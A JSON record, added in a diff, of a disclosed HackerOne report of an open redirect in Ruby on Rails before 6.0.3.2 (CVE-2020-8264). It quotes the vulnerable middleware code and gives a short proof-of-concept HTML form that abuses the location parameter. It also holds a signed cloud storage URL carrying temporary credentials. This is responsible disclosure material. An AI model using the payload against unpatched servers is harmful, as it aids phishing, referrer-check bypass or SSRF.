@@ -1,0 +1,212 @@
+{
+  "id": 904059,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDQwNTk=",
+  "url": "https://hackerone.com/reports/904059",
+  "title": "Open Redirect (6.0.0 < rails < 6.0.3.2)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-06-21T02:15:14.122Z",
+  "submitted_at": "2020-06-21T02:15:14.122Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/f287f761e822d68f6d2a6fdde3cb8c84c04060fd04f19b5dab1fe20f75f44886"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8264",
+    "CVE-2020-8185"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-12-22T16:47:02.435Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-22T16:46:58.144Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\nI was looking at the change log (https://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed79fc2) for CVE-2020-8185 and found another problem existed.\n\nhttps://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L21\n\n```ruby\n  redirect_to request.params[:location]\nend\n\nprivate\n  def actionable_request?(request)\n    request.show_exceptions? && request.post? && request.path == endpoint\n  end\n\n  def redirect_to(location)\n    body = \"<html><body>You are being <a href=\\\"#{ERB::Util.unwrapped_html_escape(location)}\\\">redirected</a>.</body></html>\"\n\n    [302, {\n      \"Content-Type\" => \"text/html; charset=#{Response.default_charset}\",\n      \"Content-Length\" => body.bytesize.to_s,\n      \"Location\" => location,\n    }, [body]]\n  end\n```\n\nThere was an open redirect issue because the request parameter `location` was not validated.\nIn 6.0.3.2, since the condition of `actionable_request?` has changed, this problem is less likely to occur.\n\n\n### PoC\n\n\n#### 1. Prepare server\n\nPrepare an attackable 6.0.3.1 version of Rails server\n\n```\n❯ rails -v\nRails 6.0.3.1\n\n❯ RAILS_ENV=production rails s\n...\n* Environment: production\n* Listening on tcp://0.0.0.0:3000\n```\n\n#### 2. Attack server \n\nPrepare the server for attack on another port.\n\n```html\n<form method=\"post\" action=\"http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=https://www.hackerone.com/\">\n\t<button type=\"submit\">click!</button>\n</form>\n````\n\n```\npython3 -m http.server 8000\n```\n\n#### 3. Open browser\n\nOpen the `http://localhost:8000/attack.html` url in your browser and click the button.\nRedirect to `https://www.hackerone.com/` url.\n\n{F876518}\n\n## Impact\n\nIt will be fixed with 6.0.3.2 as with CVE-2020-8185(https://groups.google.com/g/rubyonrails-security/c/pAe9EV8gbM0), but I think it is necessary to announce it again because the range of influence is different.\n\nThis open redirect changes from POST method to Get Method, so it may be difficult to use for phishing.On the other hand, it may affect bypass of referrer check or SSRF.",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 53,
+    "name": "Open Redirect"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 876518,
+      "file_name": "__________2020-06-21_10.26.21.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ro3WSUcNhjSZthT2cTFoSsaV?response-content-disposition=attachment%3B%20filename%3D%22__________2020-06-21_10.26.21.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-06-21_10.26.21.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQG25RBQ6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T045143Z&X-Amz-Expires=1821&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCzmZZdsgYhNGiAyV2w0x3AxFk%2FLt0ZYHT6%2BmcAysTUSAIhAJvmVr%2FbaurSoGNdiFz0t3yo0KnWZF6mVbkLPY7t33I2KrIFCHgQAxoMMDEzNjE5Mjc0ODQ5IgxjDhk0pb0Wrk25v84qjwUpTpt1TWh1Wtl4mcsHOtiw3NBitwEV7N7wXVfQszLYFpphVkI832Vv8y0KSr1YMGQhooNnUNsxw9juTuDG%2Fswosm1qUdLypBtxgGN1JK%2FHa9%2FxNGJPNN1sYal5vXxeWy%2FF7QRe8jFp0JaMz7pUco8dV34nkN5jWDT3Y5R9RK3HXKxuDiTXKdzGYlGNED%2B9DL1usCMV2%2FRteKr8%2FPu7VomoIKSO8WqeufU1P82R3WBdAAXmSc9teH%2BEfoNQjeDgIn%2FrtXR6epoNlEAIb8Xte3UesXmpyRd7vcRdHiA%2F3K%2BdMyx4Aritdix8ZJgAEtBsr9AWih%2Bx3BqSHhOhREJ24eIdq%2BE7xlXdpCmF0uI23iysanOIZv1Cv4QZFHuq5OAaTDXpbBLRyy7UltuoyPqUjCH%2BX7p7DsjYQb3d6ASDpY66MaGJIvTufFOG0OAbZr1S5WIKc06xmegcLALtgPCQAwkKiTSsQuwJA8QuA5QLE5JA6qo8ysu5CgDU2PhRVEFMv6WnTl06k1ciARVnJUoyZEF2oPMl7ZYMEG4t3tNEdzgEmeiLBOEjp6thyYDvX1DU10vfMHPbXh%2FX4cMmR5N7RqpXU6H86ceRV%2BGmyPnFv%2FgtMRwZfMUu4uHvosn5RuImeCHjZrdXJybd4kPk6xGnpzLbztar77TlIiFBeZPFw%2BG9FnUyan8ebr5zyxGb7C2ogaqTUHAWDTagQRPMrheYwsYzwo9QunUxLXBqX2ztcWbOXwiidBQ%2Bglb1kjy6pPwoApn42DX5aruWmBEMS7I8bzWgUkQe9rn0XNYUTsB6RqbLbqR6clmcT91p95FjPov%2BS2xm9%2B5VkTgGxUBXg5APHLRlzj17iDSLIyJoIJ%2FMxSm8MNyJttIGOrABZxCRzHljLfRH5Muj798gjd4gd9%2BauLJp%2BeGDIDxlQoTOI5jbSjYeV6khN1p3GTdTlIey3rp9qyxuDU7hXbbQtB54s3CbJgXDvummDjmpHSOqf8BZ%2B4XbVcc09dOnoMUADpRIqM%2FhUEe6KLELPB0NTciMdvqEyi7jjX3FPYet8d6uMdjZ%2BTnUha52k8%2BwLh%2BFdaJOxxwZ8i7opa5gor7qA0ATowM3HD5PFt9GGkIOlWU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c7bc98992e7a749b9e7eafbb1b2f930ba4e1149c4a57121dd07111e97267bdf1",
+      "file_size": 790214,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-12-22T16:46:58.201Z",
+  "allow_singular_disclosure_after": -174830684.97718772,
+  "singular_disclosure_allowed": true,
+  "vote_count": 19,
+  "voters": [
+    "shuvam321",
+    "ali",
+    "mzfr",
+    "bibekshah",
+    "akashhamal0x01",
+    "ahiezer",
+    "elmahdi",
+    "beastglatisant",
+    "xsstestov",
+    "zimmer75",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "904059",
+  "votes": 19,
+  "latest_disclosable_activity_at": "2020-12-22T16:47:02.528Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T12:51:43.298155",
+    "source": "https://hackerone.com/reports/904059.json",
+    "report_id": 904059
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDQwNTk=",
+    "databaseId": "904059",
+    "title": "Open Redirect (6.0.0 < rails < 6.0.3.2)",
+    "url": "https://hackerone.com/reports/904059",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-12-22T16:47:02.435Z",
+    "created_at": "2020-06-21T02:15:14.122Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzUz",
+      "name": "Open Redirect",
+      "external_id": "cwe-601"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "ooooooo_q"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIy",
+      "handle": "rails",
+      "name": "Ruby on Rails",
+      "url": "https://hackerone.com/rails",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yNjY5NDM=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-12-20T23:58:27.599Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzkwNDA1OQ==",
+    "_id": "904059",
+    "disclosed": true,
+    "votes": 19,
+    "latest_disclosable_activity_at": "2020-12-22T16:47:02.528Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDQwNTk=",
+      "databaseId": "904059",
+      "title": "Open Redirect (6.0.0 < rails < 6.0.3.2)",
+      "url": "https://hackerone.com/reports/904059",
+      "disclosed_at": "2020-12-22T16:47:02.435Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIy",
+      "handle": "rails",
+      "name": "Ruby on Rails",
+      "url": "https://hackerone.com/rails",
+      "currency": "usd"
+    }
+  }
+}
